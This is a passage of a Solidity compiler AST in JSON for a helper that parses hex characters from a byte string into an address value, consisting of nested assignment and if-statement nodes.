																			}
																		}
																	},
																	"id": 766,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "8672:22:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "8667:27:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 768,
															"nodeType": "ExpressionStatement",
															"src": "8667:27:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 781,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 769,
																	"name": "b2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 736,
																	"src": "8709:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"baseExpression": {
																						"argumentTypes": null,
																						"id": 774,
																						"name": "tmp",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 722,
																						"src": "8728:3:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					},
																					"id": 778,
																					"indexExpression": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 777,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 775,
																							"name": "i",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 739,
																							"src": "8732:1:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "+",
																						"rightExpression": {
																							"argumentTypes": null,
																							"hexValue": "31",
																							"id": 776,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "8736:1:0",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_1_by_1",
																								"typeString": "int_const 1"
																							},
																							"value": "1"
																						},
																						"src": "8732:5:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"isConstant": false,
																					"isLValue": true,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "IndexAccess",
																					"src": "8728:10:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				],
																				"id": 773,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "8722:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 772,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "8722:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 779,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "8722:17:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 771,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "8714:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint160_$",
																			"typeString": "type(uint160)"
																		},
																		"typeName": {
																			"id": 770,
																			"name": "uint160",
																			"nodeType": "ElementaryTypeName",
																			"src": "8714:7:0",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 780,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "8714:26:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "8709:31:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 782,
															"nodeType": "ExpressionStatement",
															"src": "8709:31:0"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"id": 791,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 785,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 783,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 733,
																				"src": "8760:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": ">=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3937",
																				"id": 784,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "8766:2:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_97_by_1",
																					"typeString": "int_const 97"
																				},
																				"value": "97"
																			},
																			"src": "8760:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 786,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "8759:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "&&",
																"rightExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 789,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 787,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 733,
																				"src": "8774:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "313032",
																				"id": 788,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "8780:3:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_102_by_1",
																					"typeString": "int_const 102"
																				},
																				"value": "102"
																			},
																			"src": "8774:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 790,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "8773:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"src": "8759:25:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"condition": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"id": 805,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 799,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 797,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 733,
																					"src": "8840:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": ">=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3635",
																					"id": 798,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "8846:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_65_by_1",
																						"typeString": "int_const 65"
																					},
																					"value": "65"
																				},
																				"src": "8840:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 800,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "8839:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 803,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 801,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 733,
																					"src": "8854:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "<=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3730",
																					"id": 802,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "8860:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_70_by_1",
																						"typeString": "int_const 70"
																					},
																					"value": "70"
																				},
																				"src": "8854:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 804,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "8853:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"src": "8839:24:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"falseBody": {
																	"condition": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"id": 819,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 813,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 811,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 733,
																						"src": "8919:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": ">=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 812,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "8925:2:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "8919:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 814,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "8918:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "&&",
																		"rightExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 817,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 815,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 733,
																						"src": "8933:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "<=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3537",
																						"id": 816,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "8939:2:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_57_by_1",
																							"typeString": "int_const 57"
																						},
																						"value": "57"
																					},
																					"src": "8933:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 818,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "8932:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"src": "8918:24:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"falseBody": null,
																	"id": 825,
																	"nodeType": "IfStatement",
																	"src": "8914:73:0",
																	"trueBody": {
																		"id": 824,
																		"nodeType": "Block",
																		"src": "8944:43:0",
																		"statements": [
																			{
																				"expression": {
																					"argumentTypes": null,
																					"id": 822,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 820,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 733,
																						"src": "8963:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "-=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 821,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "8969:2:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "8963:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"id": 823,
																				"nodeType": "ExpressionStatement",
																				"src": "8963:8:0"
																			}
																		]
																	}
																},
																"id": 826,
																"nodeType": "IfStatement",
																"src": "8835:152:0",
																"trueBody": {
																	"id": 810,
																	"nodeType": "Block",
																	"src": "8865:43:0",
																	"statements": [
																		{
																			"expression": {
																				"argumentTypes": null,
																				"id": 808,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 806,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 733,
																					"src": "8884:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "-=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "3535",
																					"id": 807,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "8890:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_55_by_1",
																						"typeString": "int_const 55"
																					},
																					"value": "55"
																				},
																				"src": "8884:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"id": 809,
																			"nodeType": "ExpressionStatement",
																			"src": "8884:8:0"
																		}
																	]
																}
															},
															"id": 827,
															"nodeType": "IfStatement",
															"src": "8755:232:0",
															"trueBody": {
																"id": 796,
																"nodeType": "Block",
																"src": "8786:43:0",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 794,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 792,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 733,
																				"src": "8805:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "-=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"hexValue": "3837",
																				"id": 793,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "8811:2:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_87_by_1",
																					"typeString": "int_const 87"
																				},
																				"value": "87"
																			},
																			"src": "8805:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		},
																		"id": 795,
																		"nodeType": "ExpressionStatement",
																		"src": "8805:8:0"
																	}
																]
															}
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"id": 836,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 830,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 828,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 736,
																				"src": "9006:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": ">=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3937",
																				"id": 829,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "9012:2:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_97_by_1",
																					"typeString": "int_const 97"
																				},
																				"value": "97"
																			},
																			"src": "9006:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 831,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "9005:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "&&",
																"rightExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 834,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 832,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 736,
																				"src": "9020:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "313032",
																				"id": 833,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "9026:3:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_102_by_1",
																					"typeString": "int_const 102"
																				},
																				"value": "102"
																			},
																			"src": "9020:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 835,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "9019:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"src": "9005:25:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"condition": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"id": 850,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 844,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 842,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 736,
																					"src": "9086:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": ">=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3635",
																					"id": 843,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9092:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_65_by_1",
																						"typeString": "int_const 65"
																					},
																					"value": "65"
																				},
																				"src": "9086:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 845,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "9085:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 848,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 846,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 736,
																					"src": "9100:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "<=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3730",
																					"id": 847,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9106:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_70_by_1",
																						"typeString": "int_const 70"
																					},
																					"value": "70"
																				},
																				"src": "9100:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 849,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "9099:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"src": "9085:24:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"falseBody": {
																	"condition": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"id": 864,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 858,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 856,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 736,
																						"src": "9165:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": ">=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 857,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9171:2:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "9165:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 859,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "9164:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "&&",
																		"rightExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 862,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 860,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 736,
																						"src": "9179:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "<=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3537",
																						"id": 861,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9185:2:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_57_by_1",
																							"typeString": "int_const 57"
																						},
																						"value": "57"
																					},
																					"src": "9179:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 863,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "9178:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
